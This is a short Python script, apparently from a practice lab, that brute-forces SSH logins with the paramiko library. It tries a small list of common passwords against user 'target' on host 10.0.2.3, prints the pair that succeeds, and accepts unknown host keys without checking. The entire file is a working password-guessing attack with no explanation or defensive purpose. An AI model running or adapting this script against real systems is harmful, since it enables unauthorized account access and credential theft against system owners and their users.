import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

host = "10.0.2.3"
username = "target"
passwords = ["password", "iloveu", "iloveyou"]

for password in passwords:
    try:
        ssh.connect(host, username=username, password=password)
        print("Connected to " + host + " with username: " + username + " password: " + password)
        break
    except paramiko.AuthenticationException:
        print("Authentication failed", password)
